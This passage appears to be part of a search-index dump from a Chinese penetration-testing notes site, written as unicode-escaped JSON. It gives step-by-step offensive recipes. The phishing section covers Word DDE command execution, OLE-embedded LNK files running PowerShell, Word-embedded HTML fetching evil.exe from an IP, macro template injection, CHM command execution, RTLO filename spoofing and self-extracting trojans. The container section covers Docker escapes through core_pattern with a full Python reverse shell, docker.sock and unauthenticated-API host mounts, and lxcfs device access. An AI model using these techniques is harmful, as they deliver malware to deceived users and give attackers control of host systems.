ctrl+F9,\u8fdb\u5165\u5230\u57df\u4ee3\u7801\u7f16\u8f91\u3002\u6211\u4eec\u53ef\u4ee5\u952e\u5165\u4ee5\u4e0b\u4ee3\u7801\u4f7f\u6587\u4ef6\u5728\u88ab\u6253\u5f00\u65f6\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff08word2019\u590d\u73b0\u672a\u6210\u529f\uff0cword2016\u6210\u529f\uff0c\u4f3c\u4e4e\u662fword\u7248\u672c\u95ee\u9898 \u8fd9\u4e2a\u86ee\u5b9e\u7528\u7684\uff0c\u76ee\u524d\u4f17\u591aword\u662f\u9ed8\u8ba4\u7981\u7528\u5b8f\u7684\uff0cdde\u53ea\u9700\u8981\u7528\u6237\u70b9\u51fb\u4e24\u4e2a\u6309\u94ae\u5373\u53ef\u6267\u884c\uff0c\u5b9e\u7528\u6027\u6bd4\u5b8f\u597d DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\" \u968f\u540e\u5728\u6253\u5f00\u8be5\u6587\u4ef6\u65f6\u4f1a\u51fa\u73b0\u4e24\u4e2a\u5bf9\u8bdd\u6846\uff0c\u5168\u70b9\u662f\u5c31\u4f1a\u6267\u884c\u4ee5\u4e0a\u547d\u4ee4\u4e86","title":"Word DDE"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/#office-olelnk","text":"\u6838\u5fc3\u76ee\u6807\u662f\u521b\u5efa\u4e00\u4e2a\u5185\u5d4c\u7684lnk\u6587\u4ef6\u8bf1\u5bfc\u7528\u6237\u70b9\u51fb\uff0c\u4ece\u800c\u6267\u884c\u547d\u4ee4\u3002word\uff0cexcel\u90fd\u80fd\u4f7f\u7528 \u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u5feb\u6377\u65b9\u5f0f\u5982\u4e0b \u5176\u76ee\u6807\u5904\u586b\u5199\u7684\u662f %SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -command calc \u7136\u540e\u6253\u5f00word\u6587\u4ef6\uff0c\u63d2\u5165\u5bf9\u8c61\uff0c\u9009\u62e9package\uff0c\u4e3a\u4e86\u66f4\u52a0\u903c\u771f\u52fe\u9009\u663e\u793a\u4e3a\u56fe\u6807\uff0c\u7136\u540e\u53ef\u4ee5\u66f4\u6539\u56fe\u6807\uff0c\u6211\u4eec\u5728\u66f4\u6539\u56fe\u6807\u5904\u9009\u62e9\u4e00\u4e2a\u8ff7\u60d1\u6027\u6bd4\u8f83\u5927\u7684\u56fe\u6807 \u7136\u540e\u8fdb\u5165\u521b\u5efa\u8f6f\u4ef6\u5305\u754c\u9762\uff0c\u9009\u62e9\u6211\u4eec\u521a\u521a\u521b\u5efa\u7684lnk\u6587\u4ef6\uff0c\u5199\u597d\u5377\u6807\u540d\uff0c\u7136\u540e\u5c31\u628a\u8f6f\u4ef6\u5305\u63d2\u5165\u5230word\u754c\u9762\u4e86\uff0c\u53ea\u8981\u7528\u6237\u70b9\u51fb\u8be5\u8f6f\u4ef6\u5305\u5e76\u9009\u62e9\u6267\u884c\uff0c\u5219\u4f1a\u6267\u884c\u6211\u4eec\u5728lnk\u4e2d\u5b9a\u4e49\u7684\u4ee3\u7801 \u800c\u4e14\u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u5982\u679c\u7528\u4e0a\u8ff0\u65b9\u6cd5\u628alnk\u6587\u4ef6\u653e\u5165publisher\u6587\u4ef6\uff0c\u5219\u5728\u7f51\u7edc\u4e2d\u6253\u5f00\u8be5\u6587\u4ef6\u65f6\u4e0d\u4f1a\u89e6\u53d1\u53d7\u4fdd\u62a4\u89c6\u56fe\u3002\uff08\u53ef\u80fd\u662f\u6211\u672c\u5730\u73af\u5883\u6709\u70b9\u9519\uff1f\u6211\u89c9\u5f97\u8fd9\u4e2a\u6709\u70b9\u79bb\u8c31","title":"office OLE+LNK"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/#js","text":"\u8fd9\u4e2a\u8bf4\u5b9e\u8bdd\u9700\u8981\u4e00\u70b9js\u529f\u5e95\u3002\u3002 \u8fd9\u4e2a\u65b9\u5f0f\u7684\u539f\u7406\u662f\uff0c\u5982\u679c\u6211\u4eec\u5f80word\u4e2d\u63d2\u5165\u8054\u673a\u89c6\u9891\uff0c\u90a3\u4e48\u518dword\u7684\u538b\u7f29\u5305 word/document.xml\u91cc\u7684embeddedHtml\u9879\u4e2d\u4f1a\u51fa\u73b0\u8054\u673a\u89c6\u9891\u5bf9\u5e94\u7684\u5185\u5d4chtml\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u8fd9\u4e9b\u4ee3\u7801\uff0c\u63d2\u5165\u6076\u610fjs\u4ee3\u7801\u3002 \u4e00\u822c\u7684\u5229\u7528\u65b9\u5f0f\u662f\u901a\u8fc7js\u4e0b\u8f7d\u6076\u610f\u6587\u4ef6\uff0c\u4f46\u662f\u4f3c\u4e4e\u662f\u56e0\u4e3aword\u7684\u4e00\u4e9b\u4fdd\u62a4\u673a\u5236\uff0c\u4e0d\u80fd\u5b9e\u73b0\u9875\u9762\u8df3\u8f6c\u6216\u8005\u81ea\u52a8\u70b9\u51fb\u4e0b\u8f7d\u7b49\u64cd\u4f5c(\u6253\u5f00word\u6587\u4ef6\u4f1a\u62a5\u9519),\u597d\u8ff7 <html> <body> <script> var a = document.createElement('a'); console.log(a); document.body.appendChild(a); a.style = 'display: none'; a.href = \"http://149.129.64.180/evil.exe\"; //\u8be5\u884c\u82e5\u5b58\u5728\uff0c\u6253\u5f00word\u6587\u4ef6\u4f1a\u62a5\u9519 a.download = fileName; window.URL.revokeObjectURL(url); </script> <script> a.click(); </script> </body> </html> \u6211\u770b\u4e86\u4e00\u4e2aPOC\uff0c\u91cc\u9762\u662f\u901a\u8fc7\u6784\u9020\u4e8c\u8fdb\u5236\u6570\u636e\u4ea4\u7ed9BLOB\u5bf9\u8c61\u5904\u7406\uff0c\u5e76\u81ea\u52a8\u70b9\u51fb\u7531BLOB\u5bf9\u8c61\u751f\u6210\u7684url\u5b9e\u73b0\u4e0b\u8f7d\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u800c\u8fd9\u4e9b\u4e8c\u8fdb\u5236\u6570\u636e\u5b9e\u8d28\u4e0a\u662f\u6076\u610f\u6587\u4ef6\u3002 \u56e0\u4e3a\u6211\u641e\u4e0d\u6765\u90a3\u4e2a\u4e8c\u8fdb\u5236\u6570\u636e\u600e\u4e48\u4ea7\u751f\uff0c\u6240\u4ee5\u8fd9\u4e2a\u65b9\u6cd5\u6682\u65f6\u53ea\u505a\u4e86\u89e3\u5427\u3002\u3002 \u800c\u4e14\u6211\u770b\u7684\u90a3\u4e2a\u6587\u7ae0\u7684POC\u5728\u6211\u7684word2016\u91cc\u4e0d\u80fd\u6b63\u5e38\u5de5\u4f5c\uff0c\u4e0d\u77e5\u9053\u662f\u4ec0\u4e48\u539f\u56e0 reference: https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-replacing-embedded-video-with-bogus-payload","title":"\u5d4c\u5165js\u5143\u7d20"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/#_4","text":"\u539f\u7406\u662f\uff0c\u5148\u521b\u5efa\u4e00\u4e2a\u5e26\u6a21\u677f\u7684\u6587\u6863\uff0c\u518d\u521b\u4e00\u4e2a\u542f\u7528\u5b8f\u7684\u6a21\u677f\u6587\u4ef6\u3002\u7136\u540e\u5728\u5e26\u6a21\u677f\u7684\u6587\u6863\u7684\u538b\u7f29\u5305\u91cc\u9762\u4fee\u6539\u4e00\u4e9b\u5185\u5bb9\uff0c\u4f7f\u5176\u6307\u5411\u7684\u6a21\u677f\u4fee\u6539\u4e3a\u6211\u4eec\u81ea\u5df1\u521b\u5efa\u7684\u6a21\u677f\u6587\u4ef6\uff0c\u8fd9\u4e4b\u95f4\u7684\u8fc7\u7a0b\u53ef\u4ee5\u7531smb\u534f\u8bae\u5b8c\u6210\uff0c\u6545\u8fc7\u67e5\u6740\u51e0\u7387\u8f83\u9ad8\u3002 \u6211\u4eec\u5728\u542f\u7528\u5b8f\u7684\u6a21\u677f\u6587\u4ef6\uff08doc3.dotm)\u91cc\u5199\u5165\u5b8f\u3002 Sub AutoOpen() Shell \"calc\" End Sub","title":"\u5229\u7528\u6a21\u677f\u6587\u4ef6\u6ce8\u5165\u5b8f\u6307\u4ee4"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/#chm","text":"\u65b0\u5efa\u4e00\u4e2ahtml\u6587\u4ef6\uff0c\u7f16\u7801\u683c\u5f0fANSI\uff0c\u5411\u91cc\u9762\u5199\u5165\u5982\u4e0b\u5185\u5bb9 <!DOCTYPE html><html><head><title>Mousejack replay</title><head></head><body> command exec <OBJECT id=x classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\" width=1 height=1> <PARAM name=\"Command\" value=\"ShortCut\"> <PARAM name=\"Button\" value=\"Bitmap::shortcut\"> <PARAM name=\"Item1\" value=',cmd.exe,/c calc.exe'> //\u8fd9\u4e00\u6392\u7528\u4e8e\u6267\u884c\u547d\u4ee4\uff0c\u6ce8\u610fcmd.exe\u524d\u540e\u90fd\u6709,\u6216\u8005<PARAM name=\"Item1\" value=',powershell.exe,-c calc.exe'>\u4e5f\u884c <PARAM name=\"Item2\" value=\"273,1,1\"> </OBJECT> <SCRIPT> x.Click(); </SCRIPT> </body></html> \u7528easychm\uff0c\u65b0\u5efa-\u6d4f\u89c8-\u9009\u62e9html\u6587\u4ef6\u6240\u5728\u76ee\u5f55-\u9009\u62e9html\u6587\u4ef6-\u7f16\u8bd1 \u751f\u6210\u4e00\u4e2achm\uff0c\u53cc\u51fb\uff0c\u6253\u5f00\u4e86\u8ba1\u7b97\u5668","title":"CHM \u7535\u5b50\u4e66"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/#_5","text":"\u4f7f\u7528Restorator\uff0c\u6253\u5f00\u9700\u8981\u66ff\u6362\u56fe\u6807\u7684exe\uff0c\u63d0\u4f9b\u56fe\u6807\u7684exe\uff0c\u5982\u4e0b \u53f3\u952emain.exe,\u6dfb\u52a0\u8d44\u6e90\uff0c\u56fe\u6807\uff0cid\u9009\u62e9127. \u968f\u540e\u53f3\u952eListary.exe/\u56fe\u6807/127 \u5bfc\u51fa\uff0c\u5c06\u5176\u5bfc\u51fa\u5230\u4e00\u4e2a\u6587\u4ef6\u5939 \u7136\u540e\u53f3\u952emain.exe/\u56fe\u6807\uff0c\u5bfc\u5165\uff0c\u9009\u62e9\u521a\u521a\u5bfc\u51fa\u56fe\u6807\u7684\u6587\u4ef6\u5939\uff0c\u786e\u5b9a,ctrl+\u4fdd\u5b58","title":"\u56fe\u6807\u66ff\u6362"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/#rtlo","text":"\u7ee7\u7eed\u91cd\u547d\u540d\uff0c\u5728a\u540e\u9762\u53f3\u952e\uff0c\u63d2\u5165Unicode\u63a7\u5236\u5b57\u7b26->RLO","title":"RTLO"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/%E9%92%93%E9%B1%BC%E6%8A%80%E5%B7%A7/#rar","text":"\u6728\u9a6c\u6587\u4ef6:artifact.exe \u8ff7\u60d1\u6587\u4ef6:calc.exe \u8fdb\u5165winrar\uff0c\u9009\u4e2d\u8fd9\u4e24\u4e2a\u6587\u4ef6\uff0c\u53f3\u952e\u6dfb\u52a0\u81f3\u538b\u7f29\u5305.\u521b\u5efa\u81ea\u89e3\u538b\u683c\u5f0f\u538b\u7f29\u6587\u4ef6 \u9ad8\u7ea7->\u81ea\u89e3\u538b\u9009\u9879->\u8bbe\u7f6e \u6a21\u5f0f->\u5168\u90e8\u9690\u85cf \u66f4\u65b0->\u89e3\u538b\u5e76\u66f4\u65b0\u6587\u4ef6,\u8986\u76d6\u6240\u6709\u6587\u4ef6 \u751f\u6210,\u53cc\u51fb\u8fd0\u884c","title":"rar\u89e3\u538b\u81ea\u8fd0\u884c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/","text":"\u8106\u5f31\u5e94\u7528 \u5e38\u89c1\u4e2d\u95f4\u4ef6\u7684\u653b\u51fb\u65b9\u5f0f \u529e\u516c\u7cfb\u7edf \u4e91 \u865a\u62df\u5316\u8bbe\u5907\uff08\u79c1\u6709\u4e91\uff09 \u6846\u67b6 \u6570\u636e\u5e93 \u8fd0\u7ef4\u7c7b&\u5f00\u53d1&\u8bbe\u5907 \u670d\u52a1\u7c7b","title":"\u8106\u5f31\u5e94\u7528"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/#_1","text":"\u5e38\u89c1\u4e2d\u95f4\u4ef6\u7684\u653b\u51fb\u65b9\u5f0f \u529e\u516c\u7cfb\u7edf \u4e91 \u865a\u62df\u5316\u8bbe\u5907\uff08\u79c1\u6709\u4e91\uff09 \u6846\u67b6 \u6570\u636e\u5e93 \u8fd0\u7ef4\u7c7b&\u5f00\u53d1&\u8bbe\u5907 \u670d\u52a1\u7c7b","title":"\u8106\u5f31\u5e94\u7528"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E4%BA%91/","text":"\u4e91 k8s\u5b89\u5168 \u626b\u76f2 \u6a44\u6984AWS\uff01 \u4e91\u539f\u751f\u7684\u6982\u5ff5\u4eec Docker\u9762\u4e34\u7684\u98ce\u9669 \u6a44\u6984\u963f\u91cc\u4e91\u670d\u52a1 Azure Prometheus","title":"\u4e91"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/%E4%BA%91/#_1","text":"k8s\u5b89\u5168 \u626b\u76f2 \u6a44\u6984AWS\uff01 \u4e91\u539f\u751f\u7684\u6982\u5ff5\u4eec Docker\u9762\u4e34\u7684\u98ce\u9669 \u6a44\u6984\u963f\u91cc\u4e91\u670d\u52a1 Azure Prometheus","title":"\u4e91"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Azure/Azure/","text":"Azure","title":"Azure"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Azure/Azure/#azure","text":"","title":"Azure"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/Docker%E9%9D%A2%E4%B8%B4%E7%9A%84%E9%A3%8E%E9%99%A9/","text":"Docker\u9762\u4e34\u7684\u98ce\u9669 \u76ee\u5f55 \u6211\u662f\u5426\u5728Docker\u4e2d\uff1f \u9003\u9038 \u6302\u8f7d\u5bbf\u4e3b\u673aprocfs\u9003\u9038 \u5229\u7528 \u5229\u7528docker.sock\u9020\u6210\u9003\u9038 \u5229\u7528 \u8fdc\u7a0bAPI\u672a\u6388\u6743\u9020\u6210\u9003\u9038 \u5229\u7528 \u5185\u6838\u6f0f\u6d1e \u5229\u7528lxcfs \u5229\u7528 privileged\u53c2\u6570\u7279\u6743\u5bb9\u5668\u9003\u9038 \u5229\u7528:\u76ee\u5f55\u6302\u8f7d \u5229\u7528:notify_on_release \u5229\u7528\uff1a\u91cd\u5199devices.allow SYS_PTRACE \u6743\u9650\u9003\u9038 cap_sys_module \u6743\u9650\u9003\u9038 docker runc \u9003\u9038 CVE-2019-5736 \u539f\u7406 \u5229\u7528 \u9003\u9038\u603b\u7ed3 \u6211\u662f\u5426\u5728Docker\u4e2d\uff1f \u68c0\u67e5/.dockerenv\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff1b \u68c0\u67e5/proc/1/cgroup\u5185\u662f\u5426\u5305\u542b\"docker\"\u7b49\u5b57\u7b26\u4e32\uff1b \u68c0\u67e5\u662f\u5426\u5b58\u5728container\u73af\u5883\u53d8\u91cf\u3002 \u9003\u9038 \u4eceDocker\u9003\u9038\u5230\u5bbf\u4e3b\u673a \u6302\u8f7d\u5bbf\u4e3b\u673aprocfs\u9003\u9038 procfs\u7cfb\u7edf\u8bf4\u767d\u4e86\u5c31\u662f/proc\u76ee\u5f55\uff0c\u5b83\u662f\u4e00\u4e2a\u4f2a\u6587\u4ef6\u7cfb\u7edf\uff0c\u7528\u4e8e\u53cd\u6620\u5404\u4e2a\u8fdb\u7a0b\u7684\u72b6\u6001\u7b49\u4fe1\u606f\u3002 \u5f53\u4e3b\u673a\u5d29\u6e83\u65f6\uff0c/proc/sys/kernel/core_pattern \u4f1a\u5c06\u5d29\u6e83\u65f6\u5185\u5b58\u8f6c\u50a8\u6570\u636e\u8fdb\u884c\u5bfc\u51fa\u3002 \u81ea2.6.19\u5185\u6838\u7248\u672c\u5f00\u59cb\uff0c\u652f\u6301\u4e86\u65b0\u8bed\u6cd5\uff0c\u6211\u4eec\u53ef\u4ee5\u5f80/proc/sys/kernel/core_pattern\u6587\u4ef6\u672b\u5c3e\u6dfb\u52a0\u7ba1\u9053\u7b26|\u7136\u540e\u5199\u5165\u547d\u4ee4\uff0c\u5f53\u4e3b\u673a\u5d29\u6e83\u65f6\u4fbf\u4f1a\u6267\u884c\u7ba1\u9053\u7b26\u540e\u9762\u7684\u547d\u4ee4\u3002 \u5982\u679c\u5bbf\u4e3b\u673a\u7684procfs\u7cfb\u7edf\u6302\u8f7d\u5230\u4e86docker\u91cc\u9762\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5bf9\u5bbf\u4e3b\u673a\u7684/proc/sys/kernel/core_pattern\u4efb\u610f\u5199\u5165\uff0c\u5199\u5165\u6076\u610f\u547d\u4ee4\u540e\u518d\u60f3\u529e\u6cd5\u5f15\u8d77\u62a5\u9519\u5d29\u6e83\uff0c\u8fd9\u6837\u5bbf\u4e3b\u673a\u4fbf\u4f1a\u6267\u884c\u6211\u4eec\u5199\u5165\u5230core_pattern\u91cc\u9762\u7684\u547d\u4ee4\u4e86\u3002 \u73af\u5883\u642d\u5efa\uff1a\u628a\u5bbf\u4e3b\u673a/proc\u6302\u8f7d\u5230docker /host/proc docker run -it --rm --mount type=bind,source=/proc,target=/host/proc kpli0rn/ubuntu:18.04 bash \u600e\u4e48\u68c0\u6d4b\uff1f\u904d\u5386\u6240\u6709\u6587\u4ef6\uff0c\u5982\u679c\u6709\u4e24\u4e2a\u53ca\u4ee5\u4e0acore_pattern\u6587\u4ef6\u51fa\u73b0\u5c31\u5f88\u53ef\u7591\u4e86\u3002 find / -name core_pattern \u5229\u7528 \u627e\u5230\u5f53\u524ddocker\u5728\u5bbf\u4e3b\u673a\u4e0b\u7684\u8def\u5f84 `sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` \u5b89\u88c5vim\u548cgcc\u5206\u522b\u7528\u4e8e\u7f16\u8f91exp\u548c\u7f16\u8bd1\u9020\u6210\u5d29\u6e83\u7684C\u6587\u4ef6 vim /tmp/.exp.py #!/usr/bin/python3 import os import pty import socket lhost = \"172.16.214.1\" lport = 4444 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(\"HISTFILE\", '/dev/null') pty.spawn(\"/bin/bash\") # os.remove('/tmp/.t.py') s.close() if __name__ == \"__main__\": main() \u7136\u540e\u7ed9python\u6587\u4ef6\u52a0\u4e0a\u53ef\u6267\u884c\u6743\u9650 chmod 777 /tmp/.exp.py \u5411\u6302\u8f7d\u7684core_pattern\u672b\u5c3e\u5199\u5165exp\u8def\u5f84 echo -e \"|/var/lib/docker/overlay2/20c27c85c2556a753bb6e9afc68dc82a3ab4d96e4acc8adf443491d1cf0bd526/diff/tmp/.exp.py /r core\" > /host/proc/sys/kernel/core_pattern \u8fd0\u884c\u4e00\u4e2a\u9020\u6210\u5d29\u6e83\u7684c\u7a0b\u5e8f vim t.c #include<stdio.h> int main(void) { int *a = NULL; *a = 1; return 0; } gcc t.c -o t ./t \u5c31\u4f1a\u6536\u83b7\u5bbf\u4e3b\u673a\u5f39\u56de\u6765\u7684shell \u5229\u7528docker.sock\u9020\u6210\u9003\u9038 Docker Socket \u7528\u4e8e\u5bbf\u4e3b\u673a\u4e0edocker\u5bb9\u5668\u901a\u4fe1\uff08\u67e5\u8be2\u4fe1\u606f\u3001\u4e0b\u53d1\u547d\u4ee4\u7b49\uff09 \u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u6267\u884cdocker\u6307\u4ee4\u65f6\uff0c\u662f\u901a\u8fc7Docker Socket\u4f5c\u4e3a\u4e2d\u95f4\u4eba\u8f6c\u53d1\u7684\u3002 \u5982\u679c\u5bb9\u5668\u91cc\u6302\u8f7d\u4e86\u5bbf\u4e3b\u673a\u7684docker.sock\u6587\u4ef6\uff0c\u90a3\u4e48\u5c31\u76f8\u5f53\u4e8e\u6211\u4eec\u62ff\u5230\u4e86\u5bbf\u4e3b\u673a\u7684docker\u6307\u4ee4\u6267\u884c\u6743\uff0c\u53ef\u4ee5\u5728\u5bbf\u4e3b\u673a\u4e0a\u6267\u884c\u4efb\u610fdocker\u6307\u4ee4\u3002\u53ea\u9700\u6211\u4eec\u76f4\u63a5\u521b\u5efa\u4e00\u4e2a\u7279\u6743\u5bb9\u5668\u5c31\u80fd\u8f7b\u677e\u9003\u9038\u3002 \u73af\u5883\u642d\u5efa docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock kpli0rn/ubuntu:18.04 docker exec -it with_docker_sock /bin/bash \u5b89\u88c5docker\u547d\u4ee4\u884c apt-get update apt-get install curl curl -fsSL https://get.docker.com/ | sh \u68c0\u6d4b\uff1a\u67e5\u770b\u6709\u6ca1\u6709\u53ebdocker.sock\u7684\u6587\u4ef6 \u5229\u7528 \u628a\u5bbf\u4e3b\u673a\u6839\u76ee\u5f55\u6302\u8f7d\u5230\u65b0\u5bb9\u5668\u7684/host\u76ee\u5f55\u4e0b\u3002\u5e76\u8fdb\u5165\u65b0\u5bb9\u5668\u7684shell\u91cc docker run -it -v /:/host ubuntu /bin/bash \u5b9a\u65f6\u4efb\u52a1\u5565\u7684\u5f39\u4e2ashell\u56de\u6765\u5c31\u9003\u9038\u4e86 \u8fdc\u7a0bAPI\u672a\u6388\u6743\u9020\u6210\u9003\u9038 docker remote api \u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7http\u8bf7\u6c42\u6267\u884c docker \u547d\u4ee4\u3002 \u5982\u679c\u8fd9\u4e2aapi\u5f00\u653e\u5728\u4e86\u516c\u7f51\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u8fd9\u4e2aapi\u64cd\u4f5cdocker\u3002 \u73af\u5883\u642d\u5efa systemctl stop docker //\u5148\u628adocker\u5173\u4e86 dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375 //\u8fd9\u4e2a\u7aef\u53e3\u5e76\u4e0d\u4e00\u5b9a\u662f2375\uff0c\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u5224\u65ad \u51fa\u73b0404\u5219\u8bf4\u660e\u5b58\u5728\u672a\u6388\u6743 \u5229\u7528 \u5217\u51fa\u5bb9\u5668\u4fe1\u606f curl http://<target>:2375/containers/json \u67e5\u770b\u5bb9\u5668 docker -H tcp://<target>:2375 ps -a \u65b0\u8fd0\u884c\u4e00\u4e2a\u5bb9\u5668\uff0c\u6302\u8f7d\u70b9\u8bbe\u7f6e\u4e3a\u670d\u52a1\u5668\u7684\u6839\u76ee\u5f55\u6302\u8f7d\u81f3/mnt\u76ee\u5f55\u4e0b\u3002 docker -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash \u5185\u6838\u6f0f\u6d1e \u7528exp\u786c\u9020\u5c31\u5b8c\u4e8b\u4e86 \u5229\u7528lxcfs lxcfs \u662flinux\u4e0b\u4e00\u4e2a\u7528\u4e8e\u865a\u62df\u5316\u5bb9\u5668\u7684\u5de5\u5177\u3002 \u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5bb9\u5668\u4f1a\u6302\u5728\u5bbf\u4e3b\u673a\u4e0a\u7684/proc\u76ee\u5f55,\u5176\u5305\u542b\u5982\uff1ameminfo, cpuinfo\uff0cstat\uff0c uptime\u7b49\u8d44\u6e90\u4fe1\u606f\uff0c\u53ef\u80fd\u4f1a\u5e26\u6765\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u9519\u8bef\u6216\u8005\u4e0d\u4fbf\u3002 \u800clxcfs\u4e3a\u5bb9\u5668\u63d0\u4f9b\u4e86\u4e0b\u5217procfs\u6587\u4ef6,\u6bd4\u5982\u628a\u5bbf\u4e3b\u673a\u7684 /var/lib/lxcfs/proc/memoinfo \u6587\u4ef6\u6302\u8f7d\u5230Docker\u5bb9\u5668\u7684/proc/meminfo\u4f4d\u7f6e\u540e\uff0c\u5bb9\u5668\u8bfb\u53d6\u76f8\u5e94\u5185\u5bb9\u65f6\u4f1a\u901a\u8fc7lxcfs\u83b7\u53d6\u6b63\u786e\u7684\u7ea6\u675f\u8bbe\u5b9a\uff0c\u5b9e\u73b0\u5bb9\u5668\u5185/proc\u4e0e\u7269\u7406\u673a\u9694\u79bb\u3002 /proc/cpuinfo /proc/diskstats /proc/meminfo /proc/stat /proc/swaps /proc/uptime \u73af\u5883\u642d\u5efa\uff1a apt install lxcfs \u6216\u8005 git clone https://github.com/lxc/lxcfs.git lxcfs /var/lib/lxcfs docker run -it -v /var/lib/lxcfs/:/test/:rw kpli0rn/ubuntu:18.04 /bin/bash \u6b64\u65f6\u5bb9\u5668\u91cc\u7684/test\u76ee\u5f55\u4f1a\u6709\u8fd9\u4e9b\u6587\u4ef6\uff08\u6302\u8f7d\u81ea\u5bbf\u4e3b\u673a\uff09 \u68c0\u6d4b\uff1a\u662f\u5426\u542f\u7528\u4e86lxcfs cat /proc/1/mountinfo | grep lxcfs \u5229\u7528 \u65e0\u5948\u73af\u5883\u642d\u4e0d\u4e0a\uff0c\u5c31\u7b80\u5355\u8bf4\u8bf4\u548b\u5229\u7528\u7684\u5427 https://www.ai2news.com/blog/1441724/ \u9996\u5148\u56e0\u4e3alxcfs/cgroup\u88ab\u6302\u8f7d\u8fdb\u4e86\u5bb9\u5668\uff0c\u5e76\u4e14\u5bb9\u5668\u5bf9\u6302\u5728\u8fdb\u6765\u7684lxcfs/cgroup\u6709\u8bfb\u5199\u6743\uff0c\u90a3\u4e48\u53ef\u4ee5\u5148\u4fee\u6539\u5f53\u524d\u5df2\u63a7\u5236\u5bb9\u5668\u5bf9\u5e94\u7684devices.allow\u4e3aa\u6765\u8bbe\u7f6e\u5bb9\u5668\u5141\u8bb8\u8bbf\u95ee\u6240\u6709\u7c7b\u578b\u8bbe\u5907 echo a > /test/lxcfs/cgroup/devices/docker/some_id/devices.allow 